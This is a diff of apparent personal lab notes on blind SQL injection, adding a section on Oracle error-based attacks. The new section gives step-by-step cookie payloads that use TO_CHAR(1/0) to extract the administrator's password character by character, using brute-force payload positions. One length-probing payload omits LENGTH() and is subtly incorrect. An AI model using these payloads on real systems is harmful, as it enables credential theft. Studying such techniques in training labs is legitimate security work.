@@ -136,7 +136,7 @@ In order to retrieve data we need to do that only on the second position using c
 			![[Pasted image 20240627154411.png]]
 			
 
-## 10. Blind SQL injection with conditional responses
+## 10. Blind SQL injection with conditional responses(MYSQL)
 
 We will perform injection based on the session cookie (response = welcome back message)
 ```
@@ -182,4 +182,41 @@ Using Cluster Bomb payload for efficiency&speed for all the positions (1-20)(a-z
 Cookie: TrackingId=XZqKxHXKgUbxQYVh' AND(SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§'--
 ```
 
-## 11. Blind SQL injection with conditional errors
+## 11. Blind SQL injection with conditional errors(ORACLE)
+
+We will perform injection based on the session cookie (internal server error: positive response) 
+```
+Cookie: TrackingId=XZqKxHXKgUbxQYVh
+```
+
+If (1=0) --> FALSE so will result no error (we will loose track of injection)
+```
+Cookie: TrackingId=XZqKxHXKgUbxQYVh' AND(SELECT CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a'--
+```
+
+If (1=1) --> TRUE  so will result error because of TO_CHAR(1/0) (we will build our logic on this)
+```
+Cookie: TrackingId=XZqKxHXKgUbxQYVh' AND(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a'--
+```
+
+
+If LENGTH(password)>1 --> error which means that we are on the track  
+```
+Cookie: TrackingId=XZqKxHXKgUbxQYVh' AND(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a'--
+```
+
+Using a Sniper Payload for efficiency&speed (found that password length = 20)
+```
+Cookie: TrackingId=XZqKxHXKgUbxQYVh' AND(SELECT CASE WHEN (password)>§1§ THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a'--
+```
+
+If SUBSTR(password,1,1) = 'a' --> error which means that we are on the track
+```
+Cookie: TrackingId=XZqKxHXKgUbxQYVh' AND(SELECT CASE WHEN SUBSTR(password,1,1) = 'a' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'-- 
+```
+
+Using Cluster Bomb payload for efficiency&speed for all the positions (1-20)(a-z)
+```
+Cookie: TrackingId=XZqKxHXKgUbxQYVh' AND(SELECT CASE WHEN SUBSTR(password,§1§,1) = '§a§' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'-- 
+```
+
